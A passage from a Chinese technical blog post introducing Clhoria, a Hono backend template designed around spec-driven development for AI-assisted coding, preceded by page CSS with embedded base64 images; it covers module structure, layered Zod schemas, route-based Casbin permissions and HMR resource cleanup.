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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>"AI 写的代码不符合项目规范"——这可能是当下开发者使用 AI 辅助编程时最常遇到的问题。</p>
<p>问题的根源不在 AI 的能力，而在于我们没有给 AI 足够清晰的规范。传统项目的"规范"散落在 README、Wiki、代码注释、口头约定中，AI 无法形成完整的理解。</p>
<p>Clhoria 是我基于规范驱动开发（Spec-Driven Development）理念构建的企业级 Hono 后端模板。它的核心目标是：让规范成为项目的一等公民，让 AI 能够深度理解并遵循这些规范，实现真正高效的人机协作开发。</p>
<h2 data-id="heading-1">什么是规范驱动开发</h2>
<p>规范驱动开发（SDD）颠覆了传统的开发层级关系——让规范成为主导，代码成为规范的实现。</p>
<p>在传统开发流程中，我们先写代码，再补文档，规范往往是事后补充。而 SDD 的顺序是：先定义精确的规范，再基于规范生成代码。这种方式天然适配 AI 辅助开发，因为精确的规范可以直接转化为可工作的代码。</p>
<p>Clhoria 将 SDD 落地为 6 个标准阶段：需求分析与技术架构设计、生成接口代码、生成测试用例、循环优化、验收通过、生成模块文档。每个功能模块完成后，会产出两份文档——spec.md 记录需求与架构决策，module.md 记录模块的文件索引与技术要点，为后续 AI 维护提供完整上下文。</p>
<h2 data-id="heading-2">规范如何贯穿 Clhoria 的设计</h2>
<h3 data-id="heading-3">代码结构即规范</h3>
<p>Clhoria 对路由模块的文件结构有明确约定：每个功能模块包含 handlers（业务逻辑）、routes（路由定义与 OpenAPI 规范）、index（统一导出）、types（类型定义）四个必需文件，以及 schema、services、helpers 三个可选文件。</p>
<p>这不是随意的目录划分，而是经过深思熟虑的规范。handlers 专注业务逻辑，保持纯净；routes 定义 OpenAPI 规范，代码即文档；types 集中类型定义，便于 AI 理解数据结构。当 AI 需要新增功能时，它知道应该在哪里添加什么代码。</p>
<h3 data-id="heading-4">类型系统即规范</h3>
<p>Clhoria 采用 Hono + Zod + TypeScript 的全链路类型推导。Zod Schema 分为两层：DB 层从 Drizzle 表定义生成基础 Schema，路由层继承并组合成业务 Schema。所有字段描述只在 DB 层添加，路由层只负责裁剪和扩展。</p>
<p>这套分层策略让 AI 清楚地知道：需要添加字段描述时去 DB 层，需要组合业务 Schema 时去路由层。类型约束本身就是规范，编译器会强制执行。</p>
<h3 data-id="heading-5">权限模型即规范</h3>
<p>传统后台系统的权限标识存储在数据库中，容易与代码实现不一致。Clhoria 采用完全不同的思路：API 路由本身就是权限标识。</p>
<p>基于 RESTful 路径和 Casbin KeyMatch3，权限策略直接匹配类似 GET /api/admin/users 这样的路径模式。新增接口时，无需在数据库中添加权限记录，Casbin 策略可以通过通配符自动覆盖。代码即权限，删除路由就删除了权限，不会出现孤儿数据。</p>
<p>同样的理念也应用于菜单系统和字典系统。菜单基于 Refine Resource 在编译时生成，字典基于 TypeScript 枚举映射到 PostgreSQL Enum。单一数据源，改一处全链路同步，TypeScript 编译器会在遗漏更新时报错。</p>
<h2 data-id="heading-6">为 AI 协作优化的开发体验</h2>
<h3 data-id="heading-7">毫秒级热重载与资源管理</h3>
<p>Clhoria 基于 Vite 构建开发环境，但后端 HMR 面临资源泄漏的挑战——每次热更新时，旧模块持有的数据库连接、Redis 连接、定时器等资源不会自动释放。</p>
<p>Clhoria 通过单例管理系统统一管理长连接资源，模块卸载时自动清理。同时提供资源监控插件，基于 Node.js 的 getActiveResourcesInfo 接口监控 HMR 前后的系统资源变化，使用滑动窗口检测连续增长趋势，只在累计增长达到阈值时才报警，避免误报干扰开发。</p>
<h3 data-id="heading-8">编译时性能优化</h3>
